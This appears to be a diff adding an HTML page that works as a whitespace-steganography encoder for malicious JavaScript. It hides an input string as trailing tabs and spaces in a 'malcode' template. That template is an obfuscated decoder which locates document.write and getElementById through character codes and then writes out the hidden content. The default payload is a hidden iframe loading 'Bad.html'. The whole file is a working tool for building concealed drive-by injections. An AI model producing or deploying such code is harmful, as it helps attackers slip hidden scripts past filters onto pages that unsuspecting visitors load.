@@ -1,0 +1,180 @@
+<html>
+	<head>
+	<style type="text/css">
+		body {
+			font-family: Helvetica, sans-serif;
+			font-size: 13px;
+		}
+	</style>
+	<body></body>
+	<form name="WSForm">
+		<script>
+		function toBin(inNum)
+		{
+			retVal = "";
+			rem = 0;
+			for (i = 0; i < 8; i++)
+			{
+				rem = inNum % 2;
+				if(rem == 0)
+				{
+					retVal = '\t' + retVal;
+				}
+				else
+				{
+					retVal = ' ' + retVal;
+				}
+				inNum = inNum >> 1;
+			}
+			return(retVal);		
+		}
+
+		function Encode()
+		{
+
+			str = document.WSForm.inputtext.value;
+			strLen = str.length;
+			malcode = document.WSForm.template.value.split('\n');
+			malcodeLen = malcode.length;
+			charPerLine = 1;
+			startLine = 3;
+			// start at line 2, go no further than length - 2
+			while(strLen > ((malcodeLen - 4) * charPerLine))
+			{
+				charPerLine++;
+			}
+			for(k=0; k < (strLen % charPerLine); k++)
+			{
+				str += " ";
+			}
+			strLen = str.length;
+			//output = malcode[0] + "\n" + "d=" + (strLen / charPerLine) + ";\n";
+			output = malcode[0] + "\n";
+			output += "d=" + charPerLine + ";\n";
+			output += "e=" + (strLen / charPerLine) + ";\n";
+			tempOutput = "";
+			for(x = 0; x < str.length; x++)
+			{
+				tempOutput += toBin(str.charCodeAt(x));
+			}
+			currentPos = 0;
+			for(y=startLine; y < (malcodeLen); y++)
+			{
+				tempOutput2 = "";
+				if(currentPos < tempOutput.length)
+				{
+					for(z=currentPos; z < (currentPos * charPerLine) + (charPerLine * 8); z++)
+					{
+						if(z < tempOutput.length)
+						{
+							tempOutput2 += tempOutput[z];
+						}
+					}
+					output += malcode[y].substring(0, malcode[y].length)  + tempOutput2 + "\n";
+					currentPos += (charPerLine * 8);
+				}
+				else
+				{
+					output += malcode[y] + "\n";
+				}
+			}
+			document.WSForm.encoded.value = output;
+		}
+	</script>
+	Template:
+	<br>
+	<textarea id="template" cols="80" rows="15"><script id='p'>
+d = 0;
+e = 0;
+h = this;
+for (i in h)
+{
+	if(i.length == 8)
+	{
+		if(i.charCodeAt(0) == 100)
+		{
+			if(i.charCodeAt(7) == 116)
+			{
+				break;
+			}
+		}
+	}
+}
+for (j in h[i])
+{
+	if(j.length == 5)
+	{
+		if(j.charCodeAt(0) == 119)
+		{
+			if(j.charCodeAt(1) == 114)
+			{
+				break;
+			}
+		}
+	}
+}
+for (k in h[i])
+{
+	if(k.length == 14)
+	{
+		if(k.charCodeAt(0) == 103)
+		{
+			if(k.charCodeAt(3) == 69)
+			{
+				break;
+			}
+		}
+	}
+}
+r=h[i][k]('p');
+for (l in r)
+{
+	if(l.length == 9)
+	{
+		if(l.charCodeAt(0) == 105)
+		{
+			if(l.charCodeAt(5) == 72)
+			{
+				break;
+			}
+		}
+	}
+}
+a=r[l];
+b=a.split('\n');
+o = "";
+for(c=3; c < (e+3); c++)
+{
+	s=b[c];
+	for(f=0; f < d; f++)
+	{
+		y = ((s.length - (8*d)) + (f*8));
+		v = 0;
+		for(x = 0; x < 8; x++)
+		{
+			if(s.charCodeAt(x+y) > 9)
+			{
+				v++;
+			}
+			if(x != 7)
+			{
+				v = v << 1;
+			}
+		}
+		o += String.fromCharCode(v);
+	}
+}
+h[i][j](o);
+</script>
+</textarea>
+<br>
+Text to Encode:
+<input type="text" name="inputtext" size=50 value='<iframe src="Bad.html" style="display: none">'></input>
+<br>
+<input type="button" value="Encode" onclick="Encode()">
+<br>
+Encoded Script:
+<br>
+<textarea id="encoded" cols="80" rows="15"></textarea>
+</form>
+</html>
